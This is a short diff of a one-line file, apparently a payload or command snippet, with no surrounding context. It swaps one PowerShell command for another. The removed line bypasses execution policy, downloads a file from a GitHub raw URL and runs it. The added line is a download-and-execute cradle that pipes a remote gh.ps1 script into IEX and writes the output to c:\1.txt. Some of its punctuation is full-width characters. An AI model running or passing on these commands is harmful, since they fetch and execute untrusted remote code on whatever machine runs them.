@@ -1,2 +1,1 @@
-powershell -ep bypass $c=(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/gpsqqq/f/master/calc.exe');cmd /c $c
-
+powershell -ep bypass -c IEX（new-object net.webclient）.downloadstring（'https://raw.githubusercontent.com/gpsqqq/f/master/gh.ps1'）; gh> c：\ 1.txt
